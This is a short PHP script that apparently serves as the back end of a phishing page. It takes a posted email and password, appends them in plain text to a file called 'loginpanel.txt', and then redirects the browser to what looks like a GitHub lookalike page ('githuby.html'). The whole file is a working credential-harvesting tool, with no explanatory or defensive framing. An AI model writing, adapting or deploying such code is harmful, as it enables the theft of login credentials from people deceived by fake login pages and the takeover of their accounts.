<?php
 $path = 'loginpanel.txt';
 if (isset($_POST['emaillogin']) && isset($_POST['password']))  {
    $fh = fopen($path,"a+");
    $string = $_POST['emaillogin'].' - '.$_POST['password'] ;
    fwrite($fh,$string); // Write information to the file
    fclose($fh); // Close the file
 }
 
    header("Location: http://localhost/githuby.html"); /* Redirect browser */
    

?>